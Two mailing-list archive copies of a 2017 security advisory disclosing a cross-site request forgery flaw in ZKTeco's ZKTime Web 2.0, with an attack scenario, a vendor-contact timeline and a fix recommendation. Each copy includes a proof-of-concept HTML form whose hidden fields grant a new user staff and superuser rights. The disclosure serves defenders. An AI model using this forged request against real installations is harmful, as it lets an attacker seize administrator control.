=== Content from seclists.org_86834c19_20250125_070840.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](37)
[By Date](date.html#38)
[![Next](/images/right-icon-16x16.png)](39)

[![Previous](/images/left-icon-16x16.png)](37)
[By Thread](index.html#38)
[![Next](/images/right-icon-16x16.png)](39)

![](/shared/images/nst-icons.svg#search)

# ZKTime\_Web Software 2.0 - Cross Site Request Forgery

---

*From*: Arvind Vishwakarma <arvind12786 () gmail com>

*Date*: Sun, 17 Sep 2017 21:12:35 +0400

---

```
*Vulnerability Type*: Cross Site Request Forgery (CSRF)
*Vendor of Product*: ZKTeco
*Affected Product Code Base*: ZKTime Web - 2.0.1.12280
*Affected Component*: ZK Time Web Interface Management.
*Attack Type*: Local - Authenticated
*Impact*: Escalation of Privileges

------------------------------------------

*Product description:*
ZKTime Web 2.0 is a cutting edge Web-based Time Attendance software, which
provided a stable communication for devices through GPRS/WAN, hence, users
can access the software anywhere by their Web Browser to remotely manage
hundreds of T&A terminals under complex network condition (WLAN). The
Application has an administrator role and application user role.

*Attack Scenario:*
The ZKTime Web Software allows the Administrator to elevate the privileges
of the application user by simple click of a radio button namely
"superuser". However when the request is generated there are no random
tokens attached to this request to prevent any kind of Cross Site Request
Forgery attacks. Moreover there no other protections (like administrator
password verification etc.) mechanisms in place to block any kind of forged
requests. An Attacker takes advantage of this scenario and creates a
crafted link to add himself as an administrator to the ZKTime Web Software.
He then uses social engineering methods to trick the administrator into
click the forged http request. The request is executed and the attacker
becomes the Administrator of the
ZKTime Web Software.

*Proof of Concept Code:*
Forged HTTP Request used by the attacker:

<html>
    <body>
    <form action="[http://XX.XX.XX.46:8081/data/auth/User/14/"](http://XX.XX.XX.46:8081/data/auth/User/14/%22); method="POST">
      <input type="hidden" name="pk" value="" />
      <input type="hidden" name="username" value="Pentestuser1" />
      <input type="hidden" name="Password" value="" />
      <input type="hidden" name="ResetPassword" value="" />
      <input type="hidden" name="fpidnum" value="" />
      <input type="hidden" name="fpcount" value="0" />
      <input type="hidden" name="tlng" value="en" />
      <input type="hidden" name="first_name" value="Pentest" />
      <input type="hidden" name="last_name" value="User" />
      <input type="hidden" name="email" value="" />
      <input type="hidden" name="is_staff" value="on" />
      <input type="hidden" name="is_superuser" value="on" />

      <input type="hidden" name="last_login" value="2017-08-20 14:14:34" />
      <input type="hidden" name="initial-last_login" value="2017-08-20
14:14:34" />
      <input type="hidden" name="date_joined" value="2017-08-20 14:14:34" />
      <input type="hidden" name="initial-date_joined" value="2017-08-20
14:14:34" />
      <input type="hidden" name="finnger" value="" />
      <input type="hidden" name="template" value="" />
      <input type="hidden" name="finnger10" value="" />
      <input type="hidden" name="template10" value="" />
      <input type="hidden" name="delfp" value="" />
      <input type="hidden" name="actflag" value="" />
      <input type="submit" value="Submit request" />
    </form>
</body>
</html>

*Impact:*
If the vulnerability is successfully exploited than an attacker (who would
be a normal user of the web application) can escalate his privileges and
become the administrator of ZK Time Web Software.

*Recommendation:*
Ensure that all sensitive CRUD Operations are appropriately protected with
random tokens. Alternatively, the sensitive operations could also have an
authentication layer to confirm user verification.

*Credit*: Arvind Vishwakarma

<http://ultimateone1.blogspot.ae/>

*Vulnerability Timeline:*

18th August 2017 – Vulnerability Discovered
20th August 2017 – Contacted Vendor – No Response
1st September 2017 – Contacted Vendor again – No Response
18th September 2017 – Vulnerability Disclosed

Thanks
Arvind V.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](37)
[By Date](date.html#38)
[![Next](/images/right-icon-16x16.png)](39)

[![Previous](/images/left-icon-16x16.png)](37)
[By Thread](index.html#38)
[![Next](/images/right-icon-16x16.png)](39)

### Current thread:

* **ZKTime\_Web Software 2.0 - Cross Site Request Forgery** *Arvind Vishwakarma (Sep 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_c4f749e9_20250125_070840.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

![](/shared/images/nst-icons.svg#search)

# ZKTime\_Web Software 2.0 - Cross Site Request Forgery

---

*From*: Arvind Vishwakarma <arvind12786 () gmail com>

*Date*: Mon, 18 Sep 2017 19:06:37 +0400

---

```
Vulnerability Type: Cross Site Request Forgery (CSRF)
Vendor of Product: ZKTeco
Affected Product Code Base: ZKTime Web - 2.0.1.12280
Affected Component: ZK Time Web Interface Management.
Attack Type: Local - Authenticated
Impact: Escalation of Privileges
------------------------------------------
Product description:
ZKTime Web 2.0 is a cutting edge Web-based Time Attendance software,
which provided a stable communication for devices through GPRS/WAN,
hence, users can access the software anywhere by their Web Browser to
remotely manage hundreds of T&A terminals under complex network
condition (WLAN). The Application has an administrator role and
application user role.

Attack Scenario:
The ZKTime Web Software allows the Administrator to elevate the
privileges of the application user by simple click of a radio button
namely "superuser". However when the request is generated there are no
random tokens attached to this request to prevent any kind of Cross
Site Request Forgery attacks. Moreover there no other protections
(like administrator password verification etc.) mechanisms in place to
block any kind of forged requests. An Attacker takes advantage of this
scenario and creates a crafted link to add himself as an administrator
to the ZKTime Web Software. He then uses social engineering methods to
trick the administrator into click the forged http request. The
request is executed and the attacker becomes the Administrator of the
ZKTime Web Software.

Proof of Concept Code:
Forged HTTP Request used by the attacker:

<html>
    <body>
    <form action="[http://XX.XX.XX.46:8081/data/auth/User/14/"](http://XX.XX.XX.46:8081/data/auth/User/14/%22); method="POST">
      <input type="hidden" name="pk" value="" />
      <input type="hidden" name="username" value="Pentestuser1" />
      <input type="hidden" name="Password" value="" />
      <input type="hidden" name="ResetPassword" value="" />
      <input type="hidden" name="fpidnum" value="" />
      <input type="hidden" name="fpcount" value="0" />
      <input type="hidden" name="tlng" value="en" />
      <input type="hidden" name="first_name" value="Pentest" />
      <input type="hidden" name="last_name" value="User" />
      <input type="hidden" name="email" value="" />
      <input type="hidden" name="is_staff" value="on" />
      <input type="hidden" name="is_superuser" value="on" />

      <input type="hidden" name="last_login" value="2017-08-20 14:14:34" />
      <input type="hidden" name="initial-last_login" value="2017-08-20
14:14:34" />
      <input type="hidden" name="date_joined" value="2017-08-20 14:14:34" />
      <input type="hidden" name="initial-date_joined"
value="2017-08-20 14:14:34" />
      <input type="hidden" name="finnger" value="" />
      <input type="hidden" name="template" value="" />
      <input type="hidden" name="finnger10" value="" />
      <input type="hidden" name="template10" value="" />
      <input type="hidden" name="delfp" value="" />
      <input type="hidden" name="actflag" value="" />
      <input type="submit" value="Submit request" />
    </form>
</body>
</html>

Impact:
If the vulnerability is successfully exploited than an attacker (who
would be a normal user of the web application) can escalate his
privileges and become the administrator of ZK Time Web Software.

Recommendation:
Ensure that all sensitive CRUD Operations are appropriately protected
with random tokens. Alternatively, the sensitive operations could
alsohave an authentication layer to confirm user verification.

Credit: Arvind Vishwakarma
<http://ultimateone1.blogspot.ae/>

Vulnerability Timeline:

18th August 2017 – Vulnerability Discovered
20th August 2017 – Contacted Vendor – No Response
1st September 2017 – Contacted Vendor again – No Response
18th September 2017 – Vulnerability Disclosed

```

---

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

### Current thread:

* **ZKTime\_Web Software 2.0 - Cross Site Request Forgery** *Arvind Vishwakarma (Sep 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


